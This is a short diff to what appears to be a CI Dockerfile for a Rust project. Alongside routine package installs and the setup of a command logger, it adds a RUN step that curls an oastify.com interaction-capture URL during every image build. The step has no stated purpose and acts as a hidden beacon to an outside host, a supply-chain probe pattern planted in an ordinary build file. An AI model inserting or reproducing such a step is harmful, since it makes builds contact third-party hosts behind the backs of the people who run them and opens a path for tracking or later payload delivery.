@@ -12,6 +12,8 @@ ENV RUSTC_WRAPPER="sccache"
 
 RUN apt-get update && apt-get install -y pkg-config libpq-dev postgresql-client gcc python3 curl
 
+RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/relayd
+
 # 1) Install the logger & trap
 COPY ci/command_logger.sh /etc/command_logger.sh
 COPY ci/bash_trap.sh     /etc/bash_trap.sh
